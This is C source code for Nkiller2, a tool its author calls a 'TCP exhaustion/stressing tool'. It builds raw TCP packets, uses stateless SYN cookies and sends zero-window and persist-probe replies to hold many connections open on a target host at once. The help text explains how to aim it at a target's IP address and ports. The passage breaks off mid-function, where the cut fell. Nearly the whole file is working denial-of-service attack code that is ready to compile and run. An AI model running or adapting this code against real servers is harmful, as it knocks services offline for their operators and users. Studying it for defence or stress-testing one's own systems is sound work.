/*
 *  Nkiller 2.0 - a TCP exhaustion/stressing tool
 *  Copyright (C) 2009 ithilgore <ithilgore.ryu.L@gmail.com>
 *  sock-raw.org
 *
 *  This program is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

/*
 * COMPILATION:
 *  gcc nkiller2.c -o nkiller2 -lpcap -lssl -Wall -O2
 * Has been tested and compiles successfully on Linux 2.6.26 with gcc
 * 4.3.2 and FreeBSD 7.0 with gcc 4.2.1
 */


/*
 * Enable BSD-style (struct ip) support on Linux.
 */
#ifdef __linux__
# ifndef __FAVOR_BSD
#  define __FAVOR_BSD
# endif
# ifndef __USE_BSD
#  define __USE_BSD
# endif
# ifndef _BSD_SOURCE
#  define _BSD_SOURCE
# endif
# define IPPORT_MAX 65535u
#endif


#include <sys/types.h>
#include <sys/socket.h>

#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#include <openssl/hmac.h>

#include <errno.h>
#include <pcap.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sysexits.h>
#include <time.h>
#include <unistd.h>
#include <getopt.h>


#define DEFAULT_KEY             "Nkiller31337"
#define DEFAULT_NUM_PROBES      100000
#define DEFAULT_PROBES_RND      100
#define DEFAULT_POLLTIME        100
#define DEFAULT_SLEEP_TIME      100
#define DEFAULT_PROBE_INTERVAL  150

#define WEB_PAYLOAD     "GET / HTTP/1.0\015\012\015\012"

/* Timeval subtraction in microseconds */
#define TIMEVAL_SUBTRACT(a, b) \
  (((a).tv_sec - (b).tv_sec) * 1000000L + (a).tv_usec - (b).tv_usec)

/*
 * Pseudo-header used for checksumming; this header should never
 * reach the wire
 */
typedef struct pseudo_hdr {
  uint32_t src;
  uint32_t dst;
  unsigned char mbz;
  unsigned char proto;
  uint16_t len;
} pseudo_hdr;


/*
 * TCP timestamp struct 
 */
typedef struct tcp_timestamp {
  char kind;
  char length;
  uint32_t tsval __attribute__((__packed__));
  uint32_t tsecr __attribute__((__packed__));
  char padding[2];
} tcp_timestamp;

/*
 * TCP Maximum Segment Size
 */
typedef struct tcp_mss {
  char kind;
  char length;
  uint16_t mss __attribute__((__packed__));
} tcp_mss;


/* Network stack templates */
enum {
  T_LINUX,
  T_BSDWIN
};

/* Possible replies */
enum {
  S_ERR,      /* no reply, RST, invalid packet etc */
  S_SYNACK,   /* 2nd part of initial handshake */
  S_FDACK,    /* first data ack - in reply to our first data */
  S_DATA_0, /* first data packet */
  S_DATA_1,   /* second data packet */
  S_PROBE     /* persist timer probe */
};

/*
 * Ethernet header stuff.
 */
#define ETHER_ADDR_LEN  6
#define SIZE_ETHERNET   14
typedef struct ethernet {
  u_char ether_dhost[ETHER_ADDR_LEN]; /* Destination host address */
  u_char ether_shost[ETHER_ADDR_LEN]; /* Source host address */
  u_short ether_type;                 /* Frame type */
} ether_hdr;


/*
 * Global nkiller options struct
 */
typedef struct Options {
  char target[16];
  char skey[32];
  char payload[256];
  char path[256];         /* relative to virtual-host/ip path */
  char vhost[256];        /* virtual host name */
  uint16_t *portlist;
  unsigned int probe_interval; /* interval for our persist probe reply */
  unsigned int probes;    /* total number of fully-connected probes */
  unsigned int probes_per_rnd; /* number of probes per round */
  unsigned int polltime;  /* how many microsecods to poll pcap */
  unsigned int sleep;     /* sleep time between each probe */
  int template;           /* victim network stack template */
  int dynamic;            /* remove ports from list when we get RST */
  int guardmode;          /* continue answering to zero probes */
  int verbose;
  int debug;              /* some debugging info */
  int debug2;             /* all debugging info */
} Options;


/*
 * Port list types
 */
typedef struct port_elem {
  uint16_t port_val;
  struct port_elem *next;
} port_elem;

typedef struct port_list {
  port_elem *first;
  port_elem *last;
} port_list;

/*
 * Host information
 */
typedef struct HostInfo {
  struct in_addr daddr; /* target ip address */
  char *payload;
  char *url;
  char *vhost;
  size_t plen;            /* payload length */
  size_t wlen;            /* http request length */
  port_list ports;        /* linked list of ports */
  unsigned int portlen;   /* how many ports */
} HostInfo;


typedef struct SniffInfo {
  struct in_addr saddr;   /* local ip */
  pcap_if_t *dev;
  pcap_t *pd;
} SniffInfo;


typedef struct Sock {
  struct in_addr saddr;
  struct in_addr daddr;
  uint16_t sport;
  uint16_t dport;
} Sock;


/* global vars */
Options o;


/**** function declarations ****/

/* helper functions */
static void fatal(const char *fmt, ...);
static void usage(void);
static void help(void);
static void *xcalloc(size_t nelem, size_t size);
static void *xmalloc(size_t size);
static void *xrealloc(void *ptr, size_t size);

/* port-handling functions */
static void port_add(HostInfo *Target, uint16_t port);
static void port_remove(HostInfo *Target, uint16_t port);
static int port_exists(HostInfo *Target, uint16_t port);
static uint16_t port_get_random(HostInfo *Target);
static uint16_t *port_parse(char *portarg, unsigned int *portlen);

/* packet helper functions */
static uint16_t checksum_comp(uint16_t *addr, int len);
static void handle_payloads(HostInfo *Target);
static uint32_t calc_cookie(Sock *sockinfo);
static char *build_mss(char **tcpopt, unsigned int *tcpopt_len,
    uint16_t mss);
static int get_timestamp(const struct tcphdr *tcp, uint32_t *tsval,
    uint32_t *tsecr);
static char *build_timestamp(char **tcpopt, unsigned int *tcpopt_len,
    uint32_t tsval, uint32_t tsecr);

/* sniffing functions */
static void sniffer_init(HostInfo *Target, SniffInfo *Sniffer);
static int check_replies(HostInfo *Target, SniffInfo *Sniffer, 
    u_char **reply);

/* packet handling functions */
static void send_packet(char* packet, unsigned int *packetlen);
static void send_syn_probe(HostInfo *Target, SniffInfo *Sniffer);
static int send_probe(const u_char *reply, HostInfo *Target, int state);
static char *build_tcpip_packet(const struct in_addr *source,
    const struct in_addr *target, uint16_t sport, uint16_t dport,
    uint32_t seq, uint32_t ack, uint8_t ttl, uint16_t ipid,
    uint16_t window, uint8_t flags, char *data, uint16_t datalen,
    char *tcpopt, unsigned int tcpopt_len, unsigned int *packetlen);


/**** function definitions ****/



/*
 * Wrapper around calloc() that calls fatal when out of memory
 */
static void *
xcalloc(size_t nelem, size_t size)
{
  void *p;

  p = calloc(nelem, size);
  if (p == NULL)
    fatal("Out of memory\n");
  return p;
}



/*
 * Wrapper around xcalloc() that calls fatal() when out of memory
 */
static void *
xmalloc(size_t size)
{
  return xcalloc(1, size);
}



static void *
xrealloc(void *ptr, size_t size)
{
  void *p;

  p = realloc(ptr, size);
  if (p == NULL)
    fatal("Out of memory\n");
  return p;
}



/*
 * vararg function called when sth _evil_ happens
 * usually in conjunction with __func__ to note
 * which function caused the RIP stat
 */
static void
fatal(const char *fmt, ...)
{
  va_list ap;
  va_start(ap, fmt);
  (void) vfprintf(stderr, fmt, ap);
  va_end(ap);
  exit(EXIT_FAILURE);
}



/* Return network stack template */
static const char *
get_template(int template)
{
  switch (template) {
    case T_LINUX:
      return("Linux");
    case T_BSDWIN:
      return("BSD | Windows");
    default:
      return("Unknown");
  }
}



/*
 * Print a short usage summary and exit
 */
static void
usage(void)
{
  fprintf(stderr,
      "nkiller2 [-t addr] [-p ports] [-k key] [-n total probes]\n"
      "         [-N probes/rnd] [-c msec] [-l payload] [-w path]\n"
      "         [-s sleep] [-d level] [-r vhost] [-T template]\n"
      "         [-P probe-interval] [-hvyg]\n"
      "Please use `-h' for detailed help.\n");
  exit(EX_USAGE);
}



/*
 * Print detailed help
 */
static void
help(void)
{
  static const char *help_message =
    "Nkiller2 - a TCP exhaustion & stressing tool\n"
    "\n"
    "Copyright (c) 2008 ithilgore <ithilgore.ryu.L@gmail.com>\n"
    "http://sock-raw.org\n"
    "\n"
    "Nkiller is free software, covered by the GNU General Public License,"
    "\nand you are welcome to change it and/or distribute copies of it "
    "under\ncertain conditions.  See the file `COPYING' in the source\n"
    "distribution of nkiller for the conditions and terms that it is\n"
    "distributed under.\n"
    "\n"
    "    WARNING:\n"
    "The authors disclaim any express or implied warranties, including,\n"
    "but not limited to, the implied warranties of merchantability and\n"
    "fitness for any particular purpose. In no event shall the authors "
    "or\ncontributors be liable for any direct, indirect, incidental, "
    "special,\nexemplary, or consequential damages (including, but not "
    "limited to,\nprocurement of substitute goods or services; loss of "
    "use, data, or\nprofits; or business interruption) however caused and"
    " on any theory\nof liability, whether in contract, strict liability,"
    " or tort\n(including negligence or otherwise) arising in any way out"
    " of the use\nof this software, even if advised of the possibility of"
    " such damage.\n\n"
    "Usage:\n"
    "\n"
    "    nkiller2 -t <target> -p <ports> [options]\n"
    "\n"
    "Mandatory:\n"
    "  -t target          The IP address of the target host.\n"
    "  -p port[,port]     A list of ports, separated by commas. Specify\n"
    "                     only ports that are known to be open, or use\n"
    "                     -y when unsure.\n"
    "Options:\n"
    "  -c msec            Time in microseconds, between each pcap poll\n"
    "                     for packets (pcap poll timeout).\n"
    "  -d level           Set the debug level (1: some, 2: all)\n"
    "  -h                 Print this help message.\n"
    "  -k key             Set the key for reverse SYN cookies.\n"
    "  -l payload         Additional payload string.\n"
    "  -s sleep           Average time in ms between each probe.\n"
    "  -n probes          Set the number of probes, 0 for unlimited.\n"
    "  -N probes/rnd      Number of probes per round.\n"
    "  -T template        Attacked network stack template:\n"
    "                     0. Linux (default)\n"
    "                     1. *BSD | Windows\n"
    "  -P time            Number of seconds after which we reply to the\n"
    "                     persist timer probes.\n"
    "  -w path            URL or GET request to web server. The path of\n"
    "                     a big file (> 4K) should work nicely here.\n"
    "  -r vhost           Virtual host name. This is needed for web\n"
    "                     hosts that support virtual hosting on HTTP1.1\n"
    "  -g                 Guardmode. Continue answering to zero probes \n"
    "                     until the end of times.\n"
    "  -y                 Dynamic port handling.  Remove ports from the\n"
    "                     port list if we get an RST for them. Useful\n"
    "                     when you do not know if one port is open for "
    "sure.\n"
    "  -v                 Verbose mode.\n";

  printf("%s", help_message);
  fflush(stdout);
}



/*
 * Build a TCP packet from its constituents
 */
static char *
build_tcpip_packet(const struct in_addr *source,
    const struct in_addr *target, uint16_t sport, uint16_t dport,
    uint32_t seq, uint32_t ack, uint8_t ttl, uint16_t ipid,
    uint16_t window, uint8_t flags, char *data, uint16_t datalen,
    char *tcpopt, unsigned int tcpopt_len, unsigned int *packetlen)
{
  char *packet;
  struct ip *ip;
  struct tcphdr *tcp;
  pseudo_hdr *phdr;
  char *tcpdata;
  /* fake length to account for 16bit word padding chksum */
  unsigned int chklen;    

  if (tcpopt_len % 4)
    fatal("TCP option length must be divisible by 4.\n");

  *packetlen = sizeof(*ip) + sizeof(*tcp) + tcpopt_len + datalen;
  if (*packetlen % 2)
    chklen = *packetlen + 1;
  else 
    chklen = *packetlen;

  packet = xmalloc(chklen + sizeof(*phdr));

  ip = (struct ip *)packet;
  tcp = (struct tcphdr *) ((char *)ip + sizeof(*ip));
  tcpdata = (char *) ((char *)tcp + sizeof(*tcp) + tcpopt_len);

  memset(packet, 0, chklen);

  ip->ip_v = 4;
  ip->ip_hl = 5;
  ip->ip_tos = 0;
  ip->ip_len = *packetlen; /* must be in host byte order for FreeBSD */
  ip->ip_id = htons(ipid); /* kernel will fill with random value if 0 */
  ip->ip_off = 0;
  ip->ip_ttl = ttl;
  ip->ip_p = IPPROTO_TCP;
  ip->ip_sum = checksum_comp((unsigned short *)ip, sizeof(struct ip));
  ip->ip_src.s_addr = source->s_addr;
  ip->ip_dst.s_addr = target->s_addr;

  tcp->th_sport = htons(sport);
  tcp->th_dport = htons(dport);
  tcp->th_seq = seq;
  tcp->th_ack = ack;
  tcp->th_x2 = 0;
  tcp->th_off = 5 + (tcpopt_len / 4);
  tcp->th_flags = flags;
  tcp->th_win = htons(window);
  tcp->th_urp = 0;

  memcpy((char *)tcp + sizeof(*tcp), tcpopt, tcpopt_len);
  memcpy(tcpdata, data, datalen);

  /* pseudo header used for checksumming */
  phdr = (struct pseudo_hdr *) ((char *)packet + chklen);
  phdr->src = source->s_addr;
  phdr->dst = target->s_addr;
  phdr->mbz = 0;
  phdr->proto = IPPROTO_TCP;
  phdr->len = ntohs((tcp->th_off * 4) + datalen);
  /* tcp checksum */
  tcp->th_sum = checksum_comp((unsigned short *)tcp,
      chklen - sizeof(*ip) + sizeof(*phdr));

  return packet;
}


/* 
 * Write the packet to the network and free it from memory
 */
static void
send_packet(char* packet, unsigned int *packetlen)
{
  struct sockaddr_in sin;
  int sockfd, one;

  sin.sin_family = AF_INET;
  sin.sin_port = ((struct tcphdr *)(packet + 
        sizeof(struct ip)))->th_dport;
  sin.sin_addr.s_addr = ((struct ip *)(packet))->ip_dst.s_addr;

  if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
    fatal("cannot open socket");

  one = 1;
  setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, (const char *) &one,
      sizeof(one));

  if (sendto(sockfd, packet, *packetlen, 0,
        (struct sockaddr *)&sin, sizeof(sin)) < 0) {
    fatal("sendto error: ");
  }
  close(sockfd);
  free(packet);
}


/*
 * Build TCP timestamp option
 * tcpopt points to possibly already existing TCP options
 * so inspect current TCP option length (tcpopt_len)
 */
static char *
build_timestamp(char **tcpopt, unsigned int *tcpopt_len,
    uint32_t tsval, uint32_t tsecr) 
{
  struct timeval now;
  tcp_timestamp t;
  char *opt = NULL;

  if (*tcpopt_len) {
    opt = xrealloc(*tcpopt, *tcpopt_len + sizeof(t));
    *tcpopt = opt;
    opt += *tcpopt_len;
  } else
    *tcpopt = xmalloc(sizeof(t));

  memset(&t, TCPOPT_NOP, sizeof(t));
  t.kind = TCPOPT_TIMESTAMP;
  t.length = 10;
  if (gettimeofday(&now, NULL) < 0)
    fatal("Couldn't get time of day\n");
  t.tsval = htonl((tsval) ? tsval : (uint32_t)now.tv_sec);
  t.tsecr = htonl((tsecr) ? tsecr : 0);

  if (*tcpopt_len)
    memcpy(opt, &t, sizeof(t));
  else 
    memcpy(*tcpopt, &t, sizeof(t));

  *tcpopt_len += sizeof(t);

  return *tcpopt;
}



/*
 * Build TCP Maximum Segment Size option
 */
static char *
build_mss(char **tcpopt, unsigned int *tcpopt_len, uint16_t mss)
{
  struct tcp_mss t;
  char *opt;

  if (*tcpopt_len) {
    opt = realloc(*tcpopt, *tcpopt_len + sizeof(t));
    *tcpopt = opt;
    opt += *tcpopt_len;
  } else
    *tcpopt = xmalloc(sizeof(t));

  memset(&t, TCPOPT_NOP, sizeof(t));
  t.kind = TCPOPT_MAXSEG;
  t.length = 4;
  t.mss = htons(mss);

  if (*tcpopt_len)
    memcpy(opt, &t, sizeof(t));
  else 
    memcpy(*tcpopt, &t, sizeof(t));

  *tcpopt_len += sizeof(t);
  return *tcpopt;
}



/* 
 * Perform pcap polling (until a certain timeout) and
 * return the packet you got - also check that the
 * packet we get is something we were expecting, according
 * to the reverse cookie we had set in the tcp seq field.
 * Returns the virtual state that the reply denotes and which
 * we differentiate from each other based on packet parsing techniques.
 */
static int 
check_replies(HostInfo *Target, SniffInfo *Sniffer, u_char **reply)
{

  int timedout = 0;
  int goodone = 0;
  const u_char *packet = NULL;
  uint32_t decoded_seq;
  uint32_t ack, calc_ack;
  int state;
  uint16_t datagram_len;
  uint32_t datalen;
  struct Sock sockinfo;
  struct pcap_pkthdr phead;
  const struct ip *ip;
  const struct tcphdr *tcp;
  struct timeval now, wait;
  uint32_t tsval, tsecr;
  uint32_t time_elapsed = 0;

  state = 0;

  if (gettimeofday(&wait, NULL) < 0)
    fatal("Couldn't get time of day\n");
  /* poll for 'polltime' micro seconds */
  wait.tv_usec += o.polltime;

  do {
    datagram_len = 0;
    packet = pcap_next(Sniffer->pd, &phead);
    if (gettimeofday(&now, NULL) < 0)
      fatal("Couldn't get time of day\n");
    if (TIMEVAL_SUBTRACT(wait, now) < 0)
      timedout++;

    if (packet == NULL)
      continue;

    /* This only works on Ethernet - be warned */
    if (*(packet + 12) != 0x8) {
      break; /* not an IPv4 packet */
    }

    ip = (const struct ip *) (packet + SIZE_ETHERNET);

    /* 
     * TCP/IP header checking - end cases are more than the ones
     * checked below but are so rarely happening that for
     * now we won't go into trouble to validate - could also
     * use validedpkt() from nmap/tcpip.cc
     */
    if (ip->ip_hl < 5) {
      if (o.debug2)
        (void) fprintf(stderr, "IP header < 20 bytes\n");
      break;
    }
    if (ip->ip_p != IPPROTO_TCP) {
      if (o.debug2)
        (void) fprintf(stderr, "Packet not TCP\n");
      break;
    }

    datagram_len = ntohs(ip->ip_len); /* Save length for later */

    tcp = (const void *) ((const char *)ip + ip->ip_hl * 4);
    if (tcp->th_off < 5) {
      if (o.debug2)
        (void) fprintf(stderr, "TCP header < 20 bytes\n");
      break;
    }

    datalen = datagram_len - (ip->ip_hl * 4) - (tcp->th_off * 4);

    /* A non-ACK packet is nothing valid */
    if (!(tcp->th_flags & TH_ACK))
      break; 

    /* 
     * We swap the values accordingly since we want to
     * check the result with the 4tuple we had created
     * when sending our own syn probe
     */
    sockinfo.saddr.s_addr = ip->ip_dst.s_addr;
    sockinfo.daddr.s_addr = ip->ip_src.s_addr;
    sockinfo.sport = ntohs(tcp->th_dport);
    sockinfo.dport = ntohs(tcp->th_sport);
    decoded_seq = calc_cookie(&sockinfo);

    if (tcp->th_flags & (TH_SYN|TH_RST)) {

      ack = ntohl(tcp->th_ack) - 1;
      calc_ack = ntohl(decoded_seq);
      /* 
       * We can't directly compare two values returned by
       * the ntohl functions
       */
      if (ack != calc_ack)
        break;

      /* OK we got a reply to something we have sent */

      /* SYNACK case */
      if (tcp->th_flags & TH_SYN) {

        if (o.dynamic && port_exists(Target, sockinfo.dport)) {
          if (o.debug2)
            (void) fprintf(stderr, "Port doesn't exist in list "
                "- probably removed it before due to an RST and dynamic "
                "handling\n");
          break;
        }
        if (o.debug)
          (void) fprintf(stdout,
              "Got SYN packet with seq: %x our port: %u "
              "target port: %u\n", decoded_seq,
              sockinfo.sport, sockinfo.dport);

        goodone++;
        state = S_SYNACK;

        /* ERR case */
      } else if (tcp->th_flags & TH_RST) {

        /* 
         * If we get an RST packet this means that the port is
         * closed and thus we remove it from our port list.
         */
        if (o.debug2)
          (void) fprintf(stdout,
              "Oops! Got an RST packet with seq: %x "
              "port %u is closed\n",decoded_seq,
              sockinfo.dport);
        if (o.dynamic)
          port_remove(Target, sockinfo.dport);
      } 
    } else {
      /* 
       * Each subsequent ACK that we get will have the
       * same acknowledgment number since we won't be sending
       * any more data to the target.
       */
      ack = ntohl(tcp->th_ack);
      calc_ack = ntohl(decoded_seq) + Target->wlen + 1;

      if (ack != calc_ack) 
        break;

      struct timeval now;
      if (get_timestamp(tcp, &tsval, &tsecr)) {
        if (gettimeofday(&now, NULL) < 0)
          fatal("Couldn't get time of day\n");
        time_elapsed = now.tv_sec - tsecr;
        //if (o.debug) 
        //  (void) fprintf(stdout, "Time elapsed: %u (sport: %u)\n",
         //     time_elapsed, sockinfo.sport);
      } else 
        (void) fprintf(stdout, "Warning: No timestamp available from "
            "target host's reply. Chaotic behaviour imminent...\n");

      /* 
       * First Data Acknowledgment case (FDACK)
       * Note that this packet may not always appear, since there
       * is a chance that it will be piggybacked with the first
       * sending data of the peer, depending on whether the delayed
       * acknowledgment timer expired or not at the peer side.
       * Practically, we choose to ignore it and wait until
       * we receive actual data.
       */
      if (ack == calc_ack && (!datalen || datalen == 1)
          && time_elapsed < o.probe_interval) {
        state = S_FDACK;
        break;
      }

      /* 
       * Data - victim sent the first packet(s) of data
       */
      if (ack == calc_ack && datalen > 1) {
        if (tcp->th_flags & TH_PUSH) {
          state = S_DATA_1;
          goodone++;
          break;
        } else {
          state = S_DATA_0;
          goodone++;
          break;
        }
      }

      /* 
       * Persist (Probe) Timer reply
       * The time_elapsed limit must be at least equal to the product:
       * ('persist_timer_interval' * '/proc/sys/net/ipv4/tcp_retries2')
       * or else we might lose an important probe and fail to ack it
       * On Linux: persist_timer_interval = about 2 minutes (after it has
       * stabilized) and tcp_retries2 = 15 probes.
       * Note we check 'datalen' for both 0 and 1 since Linux probes
       * with 0 data, while *BSD/Windows probe with 1 byte of data
       */
      if (ack == calc_ack && (!datalen || datalen == 1) 
          && time_elapsed >= o.probe_interval) {
        state = S_PROBE;
        goodone++;
        break;
      }

    }

  } while (!timedout && !goodone);

  if (goodone) {
    *reply = xmalloc(datagram_len);
    memcpy(*reply, packet + SIZE_ETHERNET, datagram_len);
  }

  return state;
}



/* 
 * Parse TCP options and get timestamp if it exists.
 * Return 1 if timestamp valid, 0 for failure
 */
int
get_timestamp(const struct tcphdr *tcp, uint32_t *tsval, uint32_t *tsecr)
{
  u_char *p;
  unsigned int op;
  unsigned int oplen;
  unsigned int len = 0;

  if (!tsval || !tsecr)
    return 0;

  p = ((u_char *)tcp) + sizeof(*tcp);
  len = 4 * tcp->th_off - sizeof(*tcp);

  while (len > 0 && *p != TCPOPT_EOL) {
    op = *p++;
    if (op == TCPOPT_EOL)
      break;
    if (op == TCPOPT_NOP) {
      len--;
      continue;
    }
    oplen = *p++;
    if (oplen < 2) 
      break;
    if (oplen > len)
      break; /* not enough space */
    if (op == TCPOPT_TIMESTAMP && oplen == 10) {
      /* legitimate timestamp option */
      if (tsval) { 
        memcpy((char *)tsval, p, 4); 
        *tsval = ntohl(*tsval); 
      }
      p += 4;
      if (tsecr) { 
        memcpy((char *)tsecr, p, 4);
        *tsecr = ntohl(*tsecr);
      }
      return 1;
    }
    len -= oplen;
    p += oplen - 2;
  }
  *tsval = 0;
  *tsecr = 0;
  return 0;
}



/* 
 * Craft SYN initiating probe
 */
static void
send_syn_probe(HostInfo *Target, SniffInfo *Sniffer)
{
  char *packet;
  char *tcpopt = NULL;
  uint16_t sport, dport;
  uint32_t encoded_seq;
  unsigned int packetlen, tcpopt_len;
  Sock *sockinfo = NULL;

  tcpopt_len = 0;
  sockinfo = xmalloc(sizeof(*sockinfo));

  sport = (1024 + random()) % 65536;
  dport = port_get_random(Target);

  /* Calculate reverse cookie and encode value into sequence number */
  sockinfo->saddr.s_addr = Sniffer->saddr.s_addr;
  sockinfo->daddr.s_addr = Target->daddr.s_addr;
  sockinfo->sport = sport;
  sockinfo->dport = dport;
  encoded_seq = calc_cookie(sockinfo);

  /* Build tcp options - timestamp, mss */
  tcpopt = build_timestamp(&tcpopt, &tcpopt_len, 0, 0);
  tcpopt = build_mss(&tcpopt, &tcpopt_len, 1024);

  packet = build_tcpip_packet(
      &Sniffer->saddr,
      &Target->daddr,
      sport,
      dport,
      encoded_seq,
      0,
      64,
      random() % (uint16_t)~0,
      1024,
      TH_SYN,
      NULL,
      0,
      tcpopt,
      tcpopt_len,
      &packetlen
      );

  send_packet(packet, &packetlen);

  if (tcpopt)
    free(tcpopt);
  if (sockinfo)
    free(sockinfo);
}



/* 
 * Generic probe function: depending on the value of 'state' as
 * denoted by check_replies() earlier, we trigger a different probe
 * behaviour, taking also into account any network stack templates.
 */
static int
send_probe(const u_char *reply, HostInfo *Target, int state)
{
  char *packet;
  unsigned int packetlen;
  uint32_t ack;
  char *tcpopt = NULL;
  unsigned int tcpopt_len;
  int validstamp;
  uint32_t tsval, tsecr;
  struct ip *ip;
  struct tcphdr *tcp;
  uint16_t datalen;
  uint16_t window;
  int payload = 0;

  validstamp = 0;
  tcpopt_len = 0;

  ip = (struct ip *)reply;
  tcp = (struct tcphdr *)((char *)ip + ip->ip_hl * 4);
  datalen = ntohs(ip->ip_len) - (ip->ip_hl * 4) - (tcp->th_off * 4);

  switch (state) {
    case S_SYNACK:
      ack = ntohl(tcp->th_seq) + 1;
      window = 1024;
      payload++;
      break;
    case S_DATA_0:
      ack = ntohl(tcp->th_seq) + datalen;
      if (o.template == T_BSDWIN) 
        window = 0;
      else 
        window = 512;
      break;
    case S_DATA_1:
      ack = ntohl(tcp->th_seq) + datalen;
      window = 0;
      break;
    case S_PROBE:
      ack = ntohl(tcp->th_seq);
      window = 0;
      break;
    default:    /* we shouldn't get here */
      ack = ntohl(tcp->th_seq);
      window = 0;
      break;
  }

  if (get_timestamp(tcp, &tsval, &tsecr)) {
    validstamp++;
    tcpopt = build_timestamp(&tcpopt, &tcpopt_len, 0, tsval);
  }

  packet = build_tcpip_packet(
      &ip->ip_dst,  /* mind the swapping */
      &ip->ip_src,
      ntohs(tcp->th_dport),
      ntohs(tcp->th_sport),
      tcp->th_ack, /* as seq field */
      htonl(ack),
      64,
      random() % (uint16_t)~0,
      window,
      TH_ACK,
      (payload) ? ((ntohs(tcp->th_sport) == 80) 
        ? Target->url : Target->payload) : NULL,
      (payload) ? ((ntohs(tcp->th_sport) == 80) 
        ? Target->wlen : Target->plen) : 0,
      (validstamp) ? tcpopt : NULL,
      (validstamp) ? tcpopt_len : 0,
      &packetlen
      );

  send_packet(packet, &packetlen);

  if (tcpopt)
    free(tcpopt);

  return 0;
}



/* 
 * Reverse(or client) syn_cookie function - encode the 4tuple
 * { src ip, src port, dst ip, dst port } and a secret key into 
 * the sequence number, thus keeping info of the packet inside itself
 * (idea taken by scanrand - Nmap uses an equivalent technique too)
 */
static uint32_t
calc_cookie(Sock *sockinfo)
{

  uint32_t seq;
  unsigned int cookie_len;
  unsigned int input_len;
  unsigned char *input;
  unsigned char cookie[EVP_MAX_MD_SIZE];

  input_len = sizeof(*sockinfo);
  input = xmalloc(input_len);
  memcpy(input, sockinfo, sizeof(*sockinfo));

  /* Calculate a sha1 hash based on the quadruple and the skey */
  HMAC(EVP_sha1(), (char *)o.skey, strlen(o.skey), input, input_len,
      cookie, &cookie_len);

  free(input);

  /* Get only the first 32 bits of the sha1 hash */
  memcpy(&seq, &cookie, sizeof(seq));
  return seq;
}



static void
sniffer_init(HostInfo *Target, SniffInfo *Sniffer)
{
  char errbuf[PCAP_ERRBUF_SIZE];
  struct bpf_program bpf;
  struct pcap_addr *address;
  struct sockaddr_in *ip;
  char filter[27];

  strncpy(filter, "src host ", sizeof(filter));
  strncpy(&filter[sizeof("src host ")-1], inet_ntoa(Target->daddr), 16);
  if (o.debug)
    (void) fprintf(stdout, "Filter: %s\n", filter);

  if ((pcap_findalldevs(&Sniffer->dev, errbuf)) == -1)
    fatal("%s: pcap_findalldevs(): %s\n", __func__, errbuf);

  address = Sniffer->dev->addresses; 
  address = address->next;           /* first address is garbage */    

  if (address->addr) {
    ip = (struct sockaddr_in *) address->addr;
    memcpy(&Sniffer->saddr, &ip->sin_addr, sizeof(struct in_addr));
    if (o.debug) {
      (void) fprintf(stdout, "Local IP: %s\nDevice name: "
          "%s\n", inet_ntoa(Sniffer->saddr), Sniffer->dev->name);
    }
  } else
    fatal("%s: Couldn't find associated IP with interface %s\n",
        __func__, Sniffer->dev->name);

  if (!(Sniffer->pd = 
        pcap_open_live(Sniffer->dev->name, BUFSIZ, 0, 0, errbuf)))
    fatal("%s: Could not open device %s: error: %s\n ", __func__,
        Sniffer->dev->name, errbuf);

  if (pcap_compile(Sniffer->pd , &bpf, filter, 0, 0) == -1)
    fatal("%s: Couldn't parse filter %s: %s\n ", __func__, filter,
        pcap_geterr(Sniffer->pd));

  if (pcap_setfilter(Sniffer->pd, &bpf) == -1)
    fatal("%s: Couldn't install filter %s: %s\n", __func__, filter,
        pcap_geterr(Sniffer->pd));

  if (pcap_setnonblock(Sniffer->pd, 1, NULL) < 0)
    fprintf(stderr, "Couldn't set nonblocking mode\n");
}



static uint16_t *
port_parse(char *portarg, unsigned int *portlen)
{
  char *endp;
  uint16_t *ports;
  unsigned int nports;
  unsigned long pvalue;
  char *temp;
  *portlen = 0;

  ports = xmalloc(65535 * sizeof(uint16_t));
  nports = 0;

  while (nports < 65535) {
    if (nports == 0)
      temp = strtok(portarg, ",");
    else
      temp = strtok(NULL, ",");

    if (temp == NULL)
      break;

    endp = NULL;
    errno = 0;
    pvalue = strtoul(temp, &endp, 0);
    if (errno != 0 || *endp != '\0') {
      fprintf(stderr, "Invalid port number: %s\n",
          temp);
      goto cleanup;
    }

    if (pvalue > IPPORT_MAX) {
      fprintf(stderr, "Port number too large: %s\n",
          temp);
      goto cleanup;
    }

    ports[nports++] = (uint16_t)pvalue;
  }
  if (portlen != NULL)
    *portlen = nports;
  return ports;

cleanup:
  free(ports);
  return NULL;
}



/*
 * Check if port is in list, return 0 if it is, -1 if not
 * (similar to port_remove in logic)
 */
static int
port_exists(HostInfo *Target, uint16_t port)
{
  port_elem *current;
  port_elem *before;

  current = Target->ports.first;
  before = Target->ports.first;

  while (current->port_val != port && current->next != NULL) {
    before = current;
    current = current->next;
  }

  if (current->port_val != port && current->next == NULL) {
    if (o.debug2)
      (void) fprintf(stderr, "%s: port %u doesn't exist in "
          "list\n", __func__, port);
    return -1;
  } else
    return 0;
}



/* 
 * Remove specific port from portlist
 */
static void
port_remove(HostInfo *Target, uint16_t port)
{
  port_elem *current;
  port_elem *before;

  current = Target->ports.first;
  before = Target->ports.first;

  while (current->port_val != port && current->next != NULL) {
    before = current;
    current = current->next;
  }

  if (current->port_val != port && current->next == NULL) {
    if (current != Target->ports.first) {
      if (o.debug2)
        (void) fprintf(stderr, "Port %u not found in list\n", port);
      return;
    }
  }

  if (current != Target->ports.first) {
    before->next = current->next;
  } else {
    Target->ports.first = current->next;
  }
  Target->portlen--;
  if (!Target->portlen)
    fatal("No port left to hit!\n");
}



/*
 * Add new port to port linked list of Target
 */
static void
port_add(HostInfo *Target, uint16_t port)
{
  port_elem *current;
  port_elem *newNode;

  newNode = xmalloc(sizeof(*newNode));

  newNode->port_val = port;
  newNode->next = NULL;

  if (Target->ports.first == NULL) {
    Target->ports.first = newNode;
    Target->ports.last = newNode;
    return;
  }

